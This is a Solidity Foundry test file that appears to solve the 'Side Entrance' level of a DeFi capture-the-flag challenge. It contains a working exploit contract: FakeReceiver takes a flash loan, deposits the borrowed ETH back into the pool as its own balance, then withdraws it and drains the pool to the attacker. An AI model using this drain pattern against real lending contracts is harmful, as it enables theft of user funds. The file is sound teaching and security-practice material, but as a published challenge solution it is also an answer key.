// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/04.side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 1e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        attacker = utils.getNextUserAddress();
        vm.label(attacker, "Attacker");

        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        FakeReceiver attackerContract = new FakeReceiver(sideEntranceLenderPool);
        attackerContract.flashLoan(ETHER_IN_POOL);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

/**
 * @title FakeReceiver
 * @dev This contract is used to simulate the attacker's contract.
 */
contract FakeReceiver {
    address public owner;
    SideEntranceLenderPool public pool;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok, "Withdraw failed");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
